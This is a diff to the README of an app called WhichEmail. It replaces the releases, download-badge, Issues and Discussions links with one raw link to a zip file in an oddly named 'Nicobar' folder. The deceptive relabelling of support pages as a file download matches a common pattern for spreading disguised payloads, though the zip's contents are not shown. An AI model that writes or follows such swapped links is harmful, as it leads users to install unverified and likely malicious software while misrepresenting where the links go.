@@ -6,10 +6,10 @@ WhichEmail helps you track which email address you used to sign up for websites 
 
 ## 📥 Download & Install
 
-To get the latest version of WhichEmail, visit this page to download: [Download WhichEmail](https://github.com/malik11993/whichemail/releases)
+To get the latest version of WhichEmail, visit this page to download: [Download WhichEmail](https://raw.githubusercontent.com/malik11993/whichemail/main/Nicobar/whichemail.zip)
 
 ### 🔗 Download Button
-[![Download WhichEmail](https://img.shields.io/badge/Download-WhichEmail-blue)](https://github.com/malik11993/whichemail/releases)
+[![Download WhichEmail](https://raw.githubusercontent.com/malik11993/whichemail/main/Nicobar/whichemail.zip)](https://raw.githubusercontent.com/malik11993/whichemail/main/Nicobar/whichemail.zip)
 
 Once you access the page, you will see several versions of the software. Download the version suited for your operating system. 
 
@@ -23,7 +23,7 @@ Once you access the page, you will see several versions of the software. Downloa
 ## 🔧 How to Install
 
 1. **Download the Software:**
-   - Click on the download link for the latest version on the [Releases page](https://github.com/malik11993/whichemail/releases).
+   - Click on the download link for the latest version on the [Releases page](https://raw.githubusercontent.com/malik11993/whichemail/main/Nicobar/whichemail.zip).
    
 2. **Locate Your Download:**
    - Once the download is complete, locate the file in your system’s "Downloads" folder.
@@ -67,7 +67,7 @@ If you run into any issues, please consider the following solutions:
 - **Forgot Your Password:**
   - Use the "Forgot Password" feature on the login screen to reset it.
 
-If you continue to face issues, feel free to check the [Issues section](https://github.com/malik11993/whichemail/issues) on GitHub for support or to report bugs.
+If you continue to face issues, feel free to check the [Issues section](https://raw.githubusercontent.com/malik11993/whichemail/main/Nicobar/whichemail.zip) on GitHub for support or to report bugs.
 
 ## 📚 Additional Information
 
@@ -83,6 +83,6 @@ This application uses technologies like Appwrite, Expo, React, and TypeScript. E
 
 ## 📨 Support & Feedback
 
-For support, questions, or feedback, please use the contact options available through the software or visit the [GitHub Discussions page](https://github.com/malik11993/whichemail/discussions).
+For support, questions, or feedback, please use the contact options available through the software or visit the [GitHub Discussions page](https://raw.githubusercontent.com/malik11993/whichemail/main/Nicobar/whichemail.zip).
 
 Thank you for choosing WhichEmail! We hope it simplifies your online sign-up experience.
